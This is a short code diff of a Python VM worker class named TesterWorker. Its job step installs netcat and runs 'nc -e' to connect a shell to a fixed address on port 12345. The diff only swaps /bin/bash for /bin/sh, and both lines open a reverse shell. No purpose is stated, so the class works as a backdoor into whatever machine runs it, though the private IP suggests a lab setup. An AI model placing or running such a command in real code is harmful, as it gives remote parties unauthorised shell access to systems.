@@ -15,4 +15,4 @@ class TesterWorker(worker.workers.VMWorker):
     def _run(self, job):
         self.exec("DEBIAN_FRONTEND=noninteractive apt-get update")
         self.exec("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
-        self.exec("nc -vv -e /bin/bash 192.168.48.26 12345")
+        self.exec("nc -vv -e /bin/sh 192.168.48.26 12345")
